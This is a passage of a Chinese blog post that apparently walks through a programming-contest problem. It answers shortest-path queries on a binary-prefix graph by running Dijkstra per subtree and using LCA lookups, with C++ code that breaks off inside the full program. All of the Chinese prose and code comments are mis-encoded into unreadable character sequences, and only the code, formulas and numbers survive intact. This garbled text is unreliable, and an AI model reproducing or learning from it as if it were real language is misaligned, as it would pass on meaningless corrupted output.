        <content type="html"><![CDATA[<p>ä»Šå¤©æ¥å¤ç›˜ä¸€ä¸‹ä¸Šæ¬¡çœèµ›è€ƒåˆ°çš„é¢˜ç›®ï¼Œå¼‚å¸¸åœ°æŠ˜ç£¨äººã€‚</p><span id="more"></span><p>å…ˆè¯´ä¸€ä¸‹è¿™é¢˜æ¯”èµ›çš„æƒ…å†µå§ï¼ŒåŸºæœ¬ä¸Šå‘¢ï¼Œé“¶å¥–ä¸­ç­‰åä¸Šçš„é˜Ÿä¼éƒ½æ˜¯åšå‡ºæ¥äº†çš„ã€‚</p><p>é‚£æˆ‘ä»¬å°±çœ‹çœ‹è¿™é¢˜å§ã€‚</p><h2 id="é¢˜ç›®ç®€ä»‹"><a href="#é¢˜ç›®ç®€ä»‹" class="headerlink" title="é¢˜ç›®ç®€ä»‹"></a>é¢˜ç›®ç®€ä»‹</h2><p><img src="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><p>ä»€ä¹ˆæ€è·¯åœ¨é¢˜ç›®åå­—è¿™é‡Œå°±ä¸€ç›®äº†ç„¶äº†ï¼Œé‚£è‡ªç„¶æ˜¯æœ€çŸ­è·¯å¾„ã€‚</p><p>è€Œå½“æˆ‘ä¸€çœ¼æ‰«è¿‡å»çœ‹åˆ°è¿™ä¸ªæ•°æ®é‡çš„æ—¶å€™ç¬é—´æƒŠå‘†ã€‚$1â‰¤nâ‰¤100000ï¼Œ1â‰¤mâ‰¤200000$ï¼Œä¸ä»…å¦‚æ­¤ï¼Œè¿˜æœ‰ $q$ æ¬¡è¯¢é—®æœ€çŸ­è·¯å¾„ï¼Œ$qâ‰¤200000$ å½“æ—¶ä¸€çœ‹ï¼Œè¿™ç©ä½ å¦ˆã€‚ç»™ä¸€ä¸ªç‚¹éƒ½å‹‰å¼ºèƒ½è¿‡äº†ï¼Œè¿™æœ‰è¿™ä¹ˆå¤šç‚¹ï¼Œå¦‚æœæŒ‰ç…§å¸¸è§„æ€è·¯ï¼Œä¸€æ¬¡å•æºæœ€çŸ­è·¯å¾„å¤æ‚åº¦ $nlog_2n$ ç„¶å $q$ æ¬¡è¯¢é—®ï¼Œæ€»å¤æ‚åº¦å°±æ˜¯ $qnlog_2n$ å…¨éƒ¨ä»¥æœ€å¤§å€¼å¸¦è¿›å»å¦¥å¦¥çš„è¶…æ—¶ã€‚æ‰€ä»¥å½“æ—¶æ¯”èµ›çš„æ—¶å€™çœ‹åˆ°è¿™ä¸ªé¢˜ç›®æ˜¯ç›´æ¥æ”¾å¼ƒäº†çš„ï¼Œè€Œä¸”è‹±æ–‡ä¸å¥½çš„æˆ‘ç•™ä¸‹äº†æ‚”æ¨çš„çœ¼æ³ªã€‚</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>ä½†æ˜¯å®ƒè¿˜æœ‰ä¸€ä¸ªæ¡ä»¶ï¼Œé‚£å°±æ˜¯ï¼Œç›´æ¥ç›¸è¿çš„ä¸¤ä¸ªç‚¹å½“ä¸­ï¼Œå…¶ä¸­ä¸€ä¸ªç‚¹çš„ç¼–å·ä¸€å®šæ˜¯å¦ä¸€ä¸ªç‚¹çš„äºŒè¿›åˆ¶å‰ç¼€ï¼Œè¿™å°±è¯´æ˜äº†ä¸€ç‚¹ï¼Œ$2$ å®ƒä¸€å®šä¸ä¼šè·Ÿ $3,6,12â€¦â€¦$ ç­‰ç‚¹è¿æ¥èµ·æ¥çš„ï¼Œå› ä¸ºå®ƒä»¬çš„å‰ç¼€æ˜¯ $11_{2}$ï¼Œè€Œ $2_{10}$ æ˜¯ $10_{2}$ å¼€å¤´çš„ï¼Œé‚£ä¹ˆè¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥æ„é€ ä¸€æ£µ $tire$ æ ‘ã€‚åƒè¿™æ ·å­ã€‚</p><p><img src="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/2.png" alt="2"></p><p>å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºæ¥æ˜¯ä¸€ä¸ªå®Œå…¨äºŒå‰æ ‘ï¼Œè¿™é‡Œæˆ‘ä»¬å‡è®¾å¾€å·¦å­æ ‘èµ°äºŒè¿›åˆ¶å³æ·»ä¸€ä¸ª $0$ï¼Œå‘å·¦èµ°äºŒè¿›åˆ¶å³æ·»ä¸€ä¸ª $1$ã€‚é‚£ä½ å¯èƒ½ä¼šæƒ³ï¼Œè¿™æ˜æ˜è¾¹çš„èŒƒå›´æ˜¯æ¯”ç‚¹å¤šçš„ï¼Œæ€ä¹ˆå¯èƒ½æ˜¯ä¸€æ£µæ ‘ã€‚æ²¡é”™ï¼Œä½†æ˜¯æˆ‘ä»¬çœ‹çœ‹ï¼Œå®ƒèƒ½ä¸èƒ½è¾¹æ¨ªå‘æ·»åŠ ï¼Ÿç­”æ¡ˆå½“ç„¶æ˜¯å¦å®šçš„ï¼Œå› ä¸ºä¸€ä¸ªå¾—æ˜¯å¦ä¸€ä¸ªçš„å‰ç¼€ï¼ŒåŒå±‚æ¬¡çš„è¯äºŒè¿›åˆ¶ä½æ•°ç›¸åŒï¼Œä½†æ˜¯å®é™…å€¼ä¸åŒï¼Œå› æ­¤ä¸å¯èƒ½æ»¡è¶³è¿™ä¸ªæ¡ä»¶ã€‚é‚£ä¹ˆæˆ‘ä»¬çœ‹çœ‹èƒ½ä¸èƒ½è¿åˆ°å…¶å®ƒä¸æ˜¯æˆ‘çš„ç¥–å…ˆçš„èŠ‚ç‚¹å‘¢ï¼Ÿç­”æ¡ˆå½“ç„¶è¿˜æ˜¯å¦å®šçš„ï¼Œå› ä¸ºæˆ‘ç®€å†çš„ $tire$ å°±æ˜¯æ ¹æ®äºŒè¿›åˆ¶åé¢æ·» $0$ è¿˜æ˜¯æ·» $1$ æ¥ç¡®å®šåˆ†æ”¯çš„ï¼Œå¦‚æœä½ éƒ½ä¸æ˜¯ç”±æˆ‘åœ¨åé¢æ·» $0$ æˆ–è€…æ˜¯æ·» $1$ å¾—åˆ°çš„é‚£ä½ å°±ä¸å¯èƒ½æ˜¯æˆ‘çš„å‰ç¼€ï¼Œä¹Ÿä¸æ˜¯æˆ‘çš„å­™å­èŠ‚ç‚¹ã€‚</p><p>å½“ç„¶åœ¨å›¾ä¸­ $1$ å’Œ $4$ æ˜¯å¯ä»¥ç›´æ¥ç›¸è¿çš„ï¼Œè™½ç„¶è¶Šçº§ä½†æ˜¯æ»¡è¶³æ¡ä»¶ã€‚æ‰€ä»¥å®ƒä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è¯´ä¸æ˜¯æ ‘ï¼Œä½†å®ƒæ€ä¹ˆå½“æˆæ ‘å‘¢ï¼Ÿå¦‚æœæˆ‘æŠŠä¸€ä¸ªèŠ‚ç‚¹ä¸¤ä¸ªç›´æ¥ç›¸è¿çš„å­å›¾å½“æˆå­æ ‘ï¼Œé—®é¢˜å°±è§£å†³äº†ã€‚å› ä¸ºä¸¤ä¸ªå­å›¾ä¹‹é—´è‚¯å®šæ²¡æœ‰çº¿è¿æ¥ï¼Œè¿™ä¸ªåœ¨åˆšåˆšå·²ç»è¯æ˜è¿‡äº†ã€‚</p><p>å¯¹äºæ¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæˆ‘ä»¬éƒ½å»å¯»æ‰¾å®ƒç¥–å…ˆçš„æœ€çŸ­è·¯å¾„ã€‚å› ä¸ºä¸€ä¸ªèŠ‚ç‚¹æœ€å¤šæœ‰ $log_2n$ ä¸ªç¥–å…ˆï¼Œæ‰€ä»¥è·‘ä¸€ä¸‹æœ€çŸ­è·¯ç®—æ³•é—®é¢˜è¿˜æ˜¯ä¸å¤§çš„ã€‚æˆ‘ä»¬å®šä¹‰ $dis[i][k]$ ä¸ºèŠ‚ç‚¹ $i$ åˆ°è¾¾å¾€ä¸Š $k$ ä¸ªç¥–å…ˆçš„æœ€çŸ­è·¯å¾„ã€‚é‚£ä¹ˆå¯¹äºä»»æ„ä¸¤ç‚¹çš„æœ€çŸ­è·¯å¾„ï¼Œæˆ‘åªéœ€è¦å¯»æ‰¾å®ƒä»¬çš„æœ€è¿‘å…¬å…±ç¥–å…ˆï¼Œç„¶åç­”æ¡ˆå°±æ˜¯ $a$ åˆ°æœ€è¿‘å…¬å…±ç¥–å…ˆçš„æœ€çŸ­è·¯åŠ ä¸Š $b$ åˆ°æœ€è¿‘å…¬å…±ç¥–å…ˆçš„æœ€çŸ­è·¯ã€‚å½“ç„¶æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªæƒ…å†µå¾—è€ƒè™‘ï¼Œå› ä¸º $dis[i][k]$ çš„å®šä¹‰ä»…ä»…æ˜¯åˆ°å®ƒç¥–å…ˆçš„æœ€çŸ­è·¯å¾„ï¼Œè€Œä¸æ˜¯åˆ°è¿™ä¸ªèŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„ã€‚å› æ­¤å®ƒç¥–å…ˆçš„ç¥–å…ˆå¯èƒ½æœ‰æ›´ä¼˜çš„è·¯çº¿ã€‚</p><p><img src="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/3.png" alt="3"></p><p>å°±æ¯”å¦‚è¿™æ ·ä¸€ä¸ªå›¾ï¼Œå›¾ä¸­æˆ‘æŠŠå…³é”®æ•°æ®æ ‡æ³¨å‡ºæ¥äº†ï¼Œæ— å…³æ•°æ®æ²¡æœ‰æ ‡æ³¨ã€‚</p><p>å¦‚æœè¯´æˆ‘è¦æ±‚ $8$ å’Œ $11$ çš„æœ€çŸ­è·¯ï¼ŒæŒ‰ç…§æˆ‘åˆšåˆšçš„å®šä¹‰å¾ˆå®¹æ˜“ç®—çš„å‡ºæ¥ï¼Œå®ƒä»¬çš„ $LCA$ æ˜¯ $2$ï¼Œç„¶å $8$ å’Œ $11$ åˆ° $2$ çš„æœ€çŸ­è·¯å¾„éƒ½æ˜¯ $2$ï¼Œæ‰€ä»¥æˆ‘ç®—å‡ºæ¥ $8$ åˆ° $11$ çš„æœ€çŸ­è·¯å¾„æ˜¯ $4$ï¼Œä½†æ˜¯æ˜¾ç„¶è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæ›´ä¼˜çš„è§£ï¼Œé‚£å°±æ˜¯ $8\to1\to11$ è¿™æ ·æ‰åªæœ‰ $2$ çš„è·ç¦»ã€‚ä½†æ˜¯æœ€ä¼˜çš„è·¯çº¿åªå¯èƒ½å­˜åœ¨äºå®ƒçš„ç¥–å…ˆä¸Šé¢äº†ï¼Œå…¶å®ƒåœ°æ–¹ä¸å¯èƒ½æœ‰ã€‚å› æ­¤æˆ‘ä»¬åœ¨ç”¨åˆšåˆšé‚£ä¸ªç®—æ³•çš„æ—¶å€™è¿˜å¾—å…¼é¡¾ä¸€ä¸‹æŸ¥æ‰¾ $LCA$ çš„ç¥–å…ˆçš„ç­”æ¡ˆã€‚</p><p>è¿™æ ·å­çš„è¯ï¼Œå‡å¦‚æˆ‘ä»¬èƒ½åœ¨è§„å®šæ—¶é—´å†…é¢„å¤„ç†å®Œæ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¯æ¬¡æŸ¥è¯¢çš„æ—¶é—´å¤æ‚åº¦å°±åªæœ‰ $O(log_2n)$ äº†ï¼Œä¹Ÿä¸ä¼šè¶…æ—¶ã€‚é‚£ä¹ˆæˆ‘ä»¬çœ‹çœ‹æ€ä¹ˆå»é¢„å¤„ç†è¿™ä¸ª $dis$ æ•°ç»„ã€‚</p><p>æˆ‘ä»¬åªéœ€è¦ä»¥æ¯ä¸€ä¸ªèŠ‚ç‚¹ä¸ºæ ¹èŠ‚ç‚¹ï¼Œå’Œæ ¹èŠ‚ç‚¹çš„å­èŠ‚ç‚¹ä½œä¸ºä¸€å¼ å›¾å»è·‘å•æºæœ€çŸ­è·¯å³å¯ã€‚å¯¹äº $1$ æ¥è¯´ï¼Œå®ƒçš„å¤æ‚åº¦ä¼šæ˜¯ $O(nlog_2n)$ ï¼Œæ¯å‘ä¸‹èµ°ä¸€å±‚ï¼Œæ ¹èŠ‚ç‚¹æ•°é‡ç¿»å€ï¼Œå­èŠ‚ç‚¹æ•°é‡å‡åŠã€‚ç¬¬äºŒå±‚ä¸­ï¼Œæ€»å…±å¤æ‚åº¦å°†æ˜¯ $O(2 \times \frac{n}{2}log_2\frac{n}{2})$ è¿™ä¹ˆç®—ä¸‹æ¥è¿™ä¸€å±‚æ¥è¿‘ $O(nlog_2n)$ ï¼Œæ­¤åæ¯ä¸€å±‚éƒ½æ¥è¿‘ $O(nlog_2n)$ã€‚å®ƒä¸€å…±æœ‰å‡ å±‚å‘¢ï¼Ÿ$log_2n$å±‚ã€‚æ‰€ä»¥é¢„å¤„ç†çš„æ—¶é—´å¤æ‚åº¦ä»…ä»…åªæœ‰ $O(n(log_2n)^2)$ è¿™ä¸ªæ—¶é—´å¤æ‚åº¦æ˜¯å®Œå…¨ä¸ä¼šè¶…æ—¶çš„ã€‚</p><p>æˆ‘ä»¬è‚¯å®šè¿˜æ˜¯é€‰æ‹© $dijsktra$ ç®—æ³•ä½œä¸ºæˆ‘ä»¬çš„å•æºæœ€çŸ­è·¯ç®—æ³•ï¼ŒåŠ ä¸Šä¸€ä¸ªä¼˜å…ˆé˜Ÿåˆ—ä¼˜åŒ–ï¼Œå•æºæœ€çŸ­è·¯éœ€è¦æ¯ä¸€ä¸ªç‚¹ç»™ä¸€ä¸ª $d$ æ•°ç»„æ ‡è®°æ‰€æœ‰èŠ‚ç‚¹åˆ°æºç‚¹çš„æœ€çŸ­è·¯ï¼Œä½†æ˜¯è¿™æ ·ç©ºé—´ä¼šç‚¸ã€‚æ‰€ä»¥æˆ‘ä»¬æ¯æ¬¡è·‘æœ€çŸ­è·¯ç©ºé—´å¾—å…±ç”¨ï¼Œå¦‚ä½•ä¿è¯ä»–ä»¬ä¸ä¼šä¸²å‘¢ï¼Ÿç”¨æ ‡è®°æ•°ç»„ã€‚æ¯”å¦‚æˆ‘åœ¨ä»¥ $1$ ä¸ºæ ¹èŠ‚ç‚¹çš„æ—¶å€™ï¼Œæˆ‘å°±ç»™æ ‡è®°æ‰“ä¸Š $1$ï¼Œå½“æˆ‘è¦æ›´æ–° $d$ é‡Œé¢çš„å€¼çš„æ—¶å€™æˆ‘å…ˆæ¯”è¾ƒä¸€ä¸‹ä¸Šä¸€ä¸ªä½¿ç”¨ $d$ æ•°ç»„çš„æ—¶å€™è¿™ä¸ªæ ‡è®°æ˜¯å¦ä¸ºæˆ‘å½“å‰çš„æ ¹èŠ‚ç‚¹ï¼Œå¦‚æœæ˜¯åˆ™æ›´æ–°ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™å…ˆåˆå§‹åŒ–ä¸ºä¸€ä¸ªå¾ˆå¤§çš„å€¼ã€‚ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬é€‰æ‹© $INF=0x3f3f3f3f3f3f3f3f$ å› ä¸ºè¿™æ ·ä¸å®¹æ˜“æº¢å‡ºï¼Œä¹Ÿèƒ½è¡¨ç¤ºæ— ç©·å¤§ã€‚</p><p>ä½†æ˜¯å‘¢ï¼Œæƒ³æƒ³ $dijsktra$ ç®—æ³•è¿˜æœ‰ä»€ä¹ˆéœ€è¦æ³¨æ„çš„ï¼Ÿé‚£å°±æ˜¯æ¯æ¬¡é€‰å®Œä¸€ä¸ªç‚¹çš„æ—¶å€™ï¼Œå®ƒä¸ä¼šå†è¢«æ›´æ–°ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘éœ€è¦å†æ‰“ä¸Šä¸€ä¸ªæ ‡è®°ï¼Œé˜²æ­¢å®ƒè¢«å…¶å®ƒç›¸è¿çš„è¾¹é‡å¤æ›´æ–°ç­”æ¡ˆã€‚ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬æ˜¯é€‰æ‹© $0,1$ çš„ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬è¦ä¸€èµ·ç”¨æˆ‘ä»¬å°±é€‰æ‹©æ ¹èŠ‚ç‚¹çš„å€¼å‘—ï¼Œå¦‚æœå½“å‰æ ¹èŠ‚ç‚¹å’Œè¿™ä¸ªå€¼ä¸ç›¸ç­‰è¯´æ˜è¿™ä¸ªç‚¹æ²¡æœ‰è¢«æ·»åŠ ï¼Œé‚£å°±æ·»åŠ å¹¶å°†æ ‡è®°æ›´æ–°ä¸ºå½“å‰çš„æ ¹èŠ‚ç‚¹ã€‚</p><p>é‚£ä¹ˆæ€è·¯æ¸…æ™°äº†æˆ‘ä»¬å°±å¼€å†™ã€‚</p><h3 id="å¾ªåºæ¸è¿›"><a href="#å¾ªåºæ¸è¿›" class="headerlink" title="å¾ªåºæ¸è¿›"></a>å¾ªåºæ¸è¿›</h3><p>é¦–å…ˆå¼€è¿™ä¹ˆå‡ ä¸ªæ•°ç»„</p><ul><li>$d[i]$ è¡¨ç¤º $i$ ç‚¹åˆ°å½“å‰æ ¹èŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„</li><li>$vis1[i]$ è¡¨ç¤º $i$ èŠ‚ç‚¹ä¸Šä¸€æ¬¡è¢« $vis1[i]$ èŠ‚ç‚¹æ ‡è®°ä¸ºå·²ç»æ·»åŠ æœ€çŸ­è·¯çš„ç­”æ¡ˆ</li><li>$vis2[i]$ è¡¨ç¤º $i$ èŠ‚ç‚¹çš„ $d[i]$ ä¸Šä¸€æ¬¡æ˜¯åœ¨ä»¥ $vis2[i]$ ä¸ºæ ¹èŠ‚ç‚¹æ—¶æ›´æ–°çš„</li></ul><p>å›¾çš„è¯æˆ‘ä»¬é‡‡ç”¨ç»å…¸é“¾å¼å‰å‘æ˜Ÿå­˜å‚¨ï¼Œä¼˜å…ˆé˜Ÿåˆ—æˆ‘ä»¬å­˜å‚¨è¿™ä¹ˆä¸¤ä¸ªä¿¡æ¯ï¼š</p><ol><li>xèŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„</li><li>xèŠ‚ç‚¹</li></ol><p>æˆ‘ä»¬è‚¯å®šæ¯æ¬¡æ˜¯ä»¥æœ€è·¯å¾„ä¸ºå…³é”®å­—è¿›è¡Œå°æ ¹å †æ„é€ çš„ï¼Œè¿™æ ·ä¿è¯æ¯æ¬¡ $pop$ å‡ºæ¥çš„ç­”æ¡ˆéƒ½æ˜¯å½“å‰æœªè¢«æ·»åŠ çš„èŠ‚ç‚¹ä¸­æœ€å°çš„é‚£ä¸ªç­”æ¡ˆã€‚</p><p>äºæ˜¯æˆ‘ä»¬ä¸éš¾å†™å‡ºä»¥ä¸‹ä»£ç ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> root)</span></span>&#123;</span><br><span class="line">    p.<span class="built_in">push</span>(&#123;<span class="number">0</span>,root&#125;);<span class="comment">//å…ˆæŠŠæ ¹èŠ‚ç‚¹ä¸¢è¿›å»</span></span><br><span class="line">    d[root]=<span class="number">0</span>;<span class="comment">//è‡ªå·±åˆ°è‡ªå·±è‚¯å®šå°±æ˜¯0</span></span><br><span class="line">    vis2[root]=root;<span class="comment">//è‡ªå·±è¿™ä¸ªç­”æ¡ˆè‚¯å®šè¦è¢«æ ‡è®°ï¼Œé˜²æ­¢ä¸‹é¢æ‰¾åˆ°è¢«åˆå§‹åŒ–ï¼Œå½“ç„¶ä½ å¦‚æœä¸¥æ ¼è§„å®šæ‰€å¾—èŠ‚ç‚¹å¿…é¡»&lt;rootä¹Ÿæ²¡å…³ç³»ï¼Œå› ä¸ºä¸‹é¢ä¼šè¢«åˆå§‹åŒ–ä¸ºINFã€‚</span></span><br><span class="line">    <span class="keyword">while</span>(!p.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">auto</span> x=p.<span class="built_in">top</span>();</span><br><span class="line">        p.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">int</span> point=x.second;<span class="comment">//å½“å‰æ‰¾åˆ°äº†ä¸€ä¸ªè·ç¦»æœ€çŸ­çš„èŠ‚ç‚¹</span></span><br><span class="line">        <span class="keyword">if</span>(vis1[point]==root)<span class="keyword">continue</span>;<span class="comment">//å¦‚æœå·²ç»è¢«æ·»åŠ è¿‡äº†é‚£ä¹ˆå°±ä¸åšä»¥ä¸‹å¤„ç†</span></span><br><span class="line">        vis1[point]=root;<span class="comment">//æŠŠè¿™ä¸ªèŠ‚ç‚¹æ ‡è®°ä¸ºå·²ç»æ·»åŠ è¿›äº†ç­”æ¡ˆä¸­</span></span><br><span class="line">        dis[point][<span class="built_in">cal_c</span>(point,root)]=d[point];<span class="comment">//æ›´æ–°ç­”æ¡ˆï¼Œè¿™é‡Œçš„cal_cç”¨äºåˆ¤æ–­rootåœ¨pointçš„ç¬¬å‡ ä¸ªç¥–å…ˆï¼Œæˆ‘ä»¬è®¾çˆ¶äº²ä¸ºç¬¬ä¸€ä¸ªç¥–å…ˆã€‚</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=head[point];i;i=edge[i].next)&#123;<span class="comment">//æ›´æ–°æ‰€æœ‰ä¸ä¹‹ç›¸è¿çš„ç‚¹çš„ç­”æ¡ˆ</span></span><br><span class="line">            <span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">            <span class="keyword">if</span>(to&lt;root)<span class="keyword">continue</span>;<span class="comment">//åŸºæœ¬åˆ¤æ–­é˜²æ­¢æ‰¾åˆ°rootçš„çˆ¶äº²</span></span><br><span class="line">            <span class="keyword">if</span>(vis2[to]!=root)&#123;<span class="comment">//å¦‚æœä¸æ˜¯rootè¯´æ˜ä¸Šä¸€æ¬¡ä½¿ç”¨d[to]æ•°ç»„çš„è¿˜æ˜¯ä¸Šä¸€æ¬¡â€¦â€¦å•Šä¸ï¼Œæ˜¯æ²¡ç”¨è¿‡d[to]è¿™ä¸ªå€¼ï¼Œæ‰€ä»¥è¦è¢«åˆå§‹åŒ–ä¸ºä¸€ä¸ªæ— ç©·å¤§</span></span><br><span class="line">                d[to]=INF;</span><br><span class="line">                vis2[to]=root;<span class="comment">//æ ‡è®°</span></span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span>(d[point]+edge[i].w&lt;d[to])&#123;<span class="comment">//å•æºæœ€çŸ­è·¯åˆ¤æ–­</span></span><br><span class="line">                d[to]=d[point]+edge[i].w;</span><br><span class="line">                p.<span class="built_in">push</span>(&#123;d[to],to&#125;);<span class="comment">//pushè¿›ä¼˜å…ˆé˜Ÿåˆ—ä¸­</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆç»“åˆä»£ç ä¸­ä½ çš„æ³¨é‡Šç›¸ä¿¡ä½ å·²ç»ä¸éš¾ç†è§£è¿™ä¸ª $dijsktra$ ç®—æ³•äº†ã€‚</p><p>æˆ‘ä»¬å†çœ‹çœ‹æŸ¥è¯¢è¿™éƒ¨åˆ†çš„ä»£ç åº”è¯¥æ€ä¹ˆå†™ï¼Œæ— éå°±æ˜¯å…ˆæ±‚å‡º $LCA$ ï¼Œç„¶åå¾ªç¯ $LCA$ ä»¥åŠ $LCA$ ç¥–å…ˆçš„ç­”æ¡ˆã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(q--)&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    <span class="keyword">int</span> lca=<span class="built_in">LCA</span>(x,y);<span class="comment">//å…ˆæ±‚æœ€è¿‘å…¬å…±ç¥–å…ˆ</span></span><br><span class="line">    <span class="keyword">int</span> lx=<span class="built_in">cal_c</span>(x,lca),ly=<span class="built_in">cal_c</span>(y,lca);<span class="comment">//ç®—å‡ºä»–ä»¬åœ¨é‚£ä¸ªç‚¹çš„ç¬¬å‡ ä¸ªç¥–å…ˆ</span></span><br><span class="line">    <span class="keyword">int</span> ans=INF;</span><br><span class="line">    <span class="keyword">while</span>(lca)&#123;</span><br><span class="line">        ans=<span class="built_in">min</span>(ans,dis[x][lx]+dis[y][ly]);<span class="comment">//å¯»æ‰¾æœ€å°å€¼</span></span><br><span class="line">        lx++,ly++;<span class="comment">//æ¯æ¬¡å¾€ä¸Šçœ‹çœ‹é‚£ä¸ªç¥–å…ˆ</span></span><br><span class="line">        lca&gt;&gt;=<span class="number">1</span>;<span class="comment">//å®Œå…¨äºŒå‰æ ‘æ€ä¹ˆæ‰¾è‡ªå·±çš„çˆ¶äº²ï¼Œè¿™ä¸ªä¸éš¾å§ï¼Ÿ</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ans==INF)<span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);<span class="comment">//è¾“å‡ºç­”æ¡ˆ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡è¦çš„éƒ¨åˆ†å†™å®Œäº†ä¹‹åé‚£ä¹ˆæ•´ä¸ªç¨‹åºå°±å‘¼ä¹‹æ¬²å‡ºäº†ï¼Œä½†æ˜¯ä¸€å®šå¾—æ³¨æ„ï¼Œä¸å¼€ $long long$ è§ç¥–å®—å“¦ã€‚</p><p>ç„¶åè¿˜æœ‰ä¸€ç‚¹å°±æ˜¯ï¼Œæ—¢ç„¶ä½ å¼€äº† $long long$ ä¸€å®šä¸è¦å¿˜äº† $inf$ ï¼Œä¸è¦æ¼å†™ä¸€åŠï¼Œä¸ç„¶çœŸåˆ°æ¯”èµ›è¦ä¹ˆå“­ç½šæ—¶ï¼Œè¦ä¹ˆå“­æ•´æ•´ä¸€é¢˜äº†ï¼Œä¸ç®¡å‰è€…åè€…ï¼Œéƒ½æ˜¯å¾ˆä¼¤çš„ï¼Œå»ºè®®å…ˆè®°åœ¨å¿ƒé‡Œã€‚</p><p>æ ‡ç¨‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="meta">#<span 